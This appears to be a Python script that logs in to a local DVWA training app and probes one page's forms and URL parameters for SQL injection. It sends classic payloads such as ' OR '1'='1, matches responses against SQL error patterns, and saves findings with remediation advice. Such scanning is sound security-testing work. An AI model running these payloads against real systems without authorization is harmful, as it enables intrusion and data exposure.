"""
sql_injection_testing.py

Logs in to DVWA (or similar app) and tests SQL injection on a given page.
Only targets forms and URL parameters of a single page.
Outputs:
  - sql_findings.json
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import json
import re
import copy

# -------- CONFIG --------
base_host = "http://localhost:8080"
login_page = base_host + "/login.php"
target_page = base_host + "/vulnerabilities/sqli/"  # page to test
username = "admin"
password = "password"
# ------------------------

# SQL injection payloads (non-destructive)
SQL_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1 -- ",
    "' OR '1'='1' -- ",
    "' OR '1'='1' /*",
    "\" OR \"\" = \"",
    "';--",
    "' OR 'a'='a",
]

# Common SQL error signatures
SQL_ERROR_SIGNATURES = [
    r"SQL syntax.*MySQL",
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"mysql_fetch",
    r"mysqli_fetch",
    r"suphp",
    r"odbc",
    r"pg_query\(",
    r"ORA-\d{5}",
    r"syntax error at or near",
    r"unclosed quotation mark after the character string",
    r"sqlite3.OperationalError",
]
SQL_ERROR_RE = re.compile("|".join(SQL_ERROR_SIGNATURES), re.IGNORECASE)

# Suggested fixes for detected vulnerabilities
def suggested_fixes():
    return {
        "parameterized_queries": "Use prepared statements / parameterized queries. Do not concatenate user input into SQL.",
        "input_validation": "Validate and sanitize inputs by type and length. Use allow-lists where possible.",
        "least_privilege": "Ensure the DB account used by the app has only necessary privileges.",
        "error_handling": "Do not display raw SQL errors to users; log them server-side instead.",
        "use_orm_or_safe_api": "Consider using an ORM or database API that defaults to parameterized queries."
    }

# ----------------- HELPER FUNCTIONS -----------------

def form_action_url(base, action):
    """Resolve relative form action URLs."""
    return urljoin(base, action) if action else base

def compare_responses(baseline_text, test_text):
    """
    Compare original response and test response:
    - rel_change: relative change in length
    - reflected: payload reflected in response
    - error_found: SQL error patterns detected
    """
    baseline_len = len(baseline_text or "")
    test_len = len(test_text or "")
    rel_change = abs(test_len - baseline_len) / baseline_len if baseline_len else (1.0 if test_len else 0.0)

    reflected = any(p.strip()[:8] in (test_text or "") for p in SQL_PAYLOADS)
    error_found = bool(SQL_ERROR_RE.search(test_text or ""))
    return {"rel_change": rel_change, "reflected": reflected, "error_found": error_found}

# ----------------- SQL INJECTION TESTING -----------------

def test_form(session, url, form):
    """
    Test a single form for SQL injection vulnerabilities.
    Returns a list of findings.
    """
    findings = []
    action_url = form_action_url(url, form.get("action"))
    method = (form.get("method") or "get").lower()
    inputs = form.get("inputs", [])

    # Prepare baseline data
    baseline_data = {inp.get("name"): "test" for inp in inputs if inp.get("name")}

    # Get baseline response
    try:
        resp = session.post(action_url, data=baseline_data) if method == "post" else session.get(action_url, params=baseline_data)
        baseline_text = resp.text if resp else ""
    except Exception:
        baseline_text = ""

    # Test each payload in each input field
    for payload in SQL_PAYLOADS:
        for field in list(baseline_data.keys()) + ["ALL_FIELDS"]:
            test_data = baseline_data.copy()
            if field == "ALL_FIELDS":
                for k in test_data.keys():
                    test_data[k] = payload
            elif field in test_data:
                test_data[field] = payload
            else:
                continue

            try:
                resp = session.post(action_url, data=test_data) if method == "post" else session.get(action_url, params=test_data)
                test_text = resp.text if resp else ""
            except Exception:
                test_text = ""
                resp = None

            comp = compare_responses(baseline_text, test_text)
            if comp["error_found"] or comp["reflected"] or comp["rel_change"] > 0.25:
                findings.append({
                    "action_url": action_url,
                    "method": method,
                    "injected_field": field,
                    "payload": payload,
                    "error_found": comp["error_found"],
                    "reflected": comp["reflected"],
                    "rel_length_change": comp["rel_change"],
                    "status_code": resp.status_code if resp else None
                })
    return findings

def test_url_params(session, url):
    """
    Test URL query parameters for SQL injection vulnerabilities.
    """
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    if not qs:
        return []

    findings = []
    try:
        resp = session.get(url)
        baseline_text = resp.text if resp else ""
    except Exception:
        baseline_text = ""

    for param in qs.keys():
        for payload in SQL_PAYLOADS:
            test_qs = copy.deepcopy(qs)
            test_qs[param] = [payload]
            new_query = urlencode({k: v[0] for k, v in test_qs.items()})
            new_url = parsed._replace(query=new_query).geturl()

            try:
                resp = session.get(new_url)
                test_text = resp.text if resp else ""
            except Exception:
                test_text = ""
                resp = None

            comp = compare_responses(baseline_text, test_text)
            if comp["error_found"] or comp["reflected"] or comp["rel_change"] > 0.25:
                findings.append({
                    "tested_url": new_url,
                    "param": param,
                    "payload": payload,
                    "error_found": comp["error_found"],
                    "reflected": comp["reflected"],
                    "rel_length_change": comp["rel_change"],
                    "status_code": resp.status_code if resp else None
                })
    return findings

# ----------------- LOGIN -----------------

def do_login(session):
    """Login to the app and return True if successful."""
    try:
        resp = session.get(login_page)
    except Exception as e:
        print("[!] Cannot reach login page:", e)
        return False

    soup = BeautifulSoup(resp.text or "", "html.parser")
    hidden_inputs = {hid.get("name"): hid.get("value", "") for hid in soup.find_all("input", {"type": "hidden"}) if hid.get("name")}

    login_data = hidden_inputs
    login_data.update({"username": username, "password": password, "Login": "Login"})

    try:
        resp2 = session.post(login_page, data=login_data)
        if resp2 and ("Logout" in resp2.text or "DVWA" in resp2.text):
            print("[+] Login successful.")
            return True
        else:
            print("[-] Login may have failed.")
            return False
    except Exception as e:
        print("[!] Login request failed:", e)
        return False

# ----------------- MAIN -----------------

if __name__ == "__main__":
    session = requests.Session()

    if not do_login(session):
        print("Exiting. Fix login first.")
        exit(1)

    # Get page HTML
    try:
        resp = session.get(target_page)
        html = resp.text if resp else ""
        soup = BeautifulSoup(html, "html.parser")
    except Exception as e:
        print("[!] Cannot fetch target page:", e)
        exit(1)

    # Detect forms and test them
    forms = []
    for form_tag in soup.find_all("form"):
        inputs = [{"name": i.get("name"), "type": i.get("type")} for i in form_tag.find_all(['input', 'textarea', 'select'])]
        forms.append({"action": form_tag.get("action"), "method": form_tag.get("method"), "inputs": inputs})

    findings = []
    for f in forms:
        findings.extend(test_form(session, target_page, f))

    # Test URL parameters
    findings.extend(test_url_params(session, target_page))

    # Save results
    output = {
        "sql_findings": findings,
        "suggested_fixes": suggested_fixes()
    }

    with open("sql_findings.json", "w", encoding="utf-8") as f:
        json.dump(output, f, indent=2, ensure_ascii=False)

    print(f"[+] SQL injection testing complete. Findings saved to sql_findings.json")
    print(f"Forms tested: {len(forms)}, Findings: {len(findings)}")
